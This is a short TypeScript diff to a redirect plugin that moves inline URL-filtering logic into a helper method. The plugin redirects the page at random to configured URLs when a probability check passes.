@@ -9,13 +9,7 @@ export class RedirectPlugin extends Plugin {
         if (!document.hasFocus()) return true;
         if (Math.random() > data.probability) return true;
 
-        var permitted: string[] = [];
-        for (var url_data of data.urls) {
-            var url_data: any = Object.entries(url_data)[0];
-            if (url_data[0] == "*" || location.href.includes(url_data[0])) {
-                permitted.push(url_data[1]);
-            }
-        }
+        var permitted: string[] = this.filter_object_by_href(data.urls);
 
         setTimeout(() => {
             location.href = permitted[this.random_index(permitted.length)]
